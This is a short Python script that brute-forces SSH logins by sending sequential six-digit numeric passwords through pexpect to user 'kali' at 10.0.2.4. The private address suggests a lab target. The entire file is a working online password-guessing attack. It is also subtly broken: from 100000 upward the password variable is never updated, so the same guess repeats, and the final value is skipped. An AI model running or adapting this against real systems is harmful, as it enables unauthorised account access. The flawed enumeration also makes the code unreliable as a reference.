import subprocess
import pexpect
import sys

USER = 'kali'
HOST = '10.0.2.4'

def bFP(password):
    print(password)
    ssh_command = f'ssh {USER}@{HOST} -p 22'
    child = pexpect.spawn(ssh_command)
    child.timeout = 30 # 30 is default
    #child.logfile = sys.stdout.buffer
    writePass = child.expect([f'{USER}@{HOST}\'s password:', pexpect.EOF, pexpect.TIMEOUT])
    if writePass == 0:
        child.sendline(password)
    isLogin = child.expect ([f'Last login', f'Permission denied, please try again.',  pexpect.EOF, pexpect.TIMEOUT])
    if isLogin == 0:
        print ('LOGIN SUCCESSFUL!!!')
        return 1
    elif isLogin == 1:
        print('Wrong password!')
        child.sendcontrol('c')
    elif isLogin == 3:
        print('timeout')
    return 0

def bruteForceNumber():
    for i in range(999999):
        if i<10:
            password = '00000' + str(i)
        elif i<100:
            password = '0000' + str(i)
        elif i<1000:
            password = '000' + str(i)
        elif i<10000:
            password = '00' + str(i)
        elif i<100000:
            password = '0' + str(i)
        if bFP(password) == 1:
            break

bruteForceNumber()

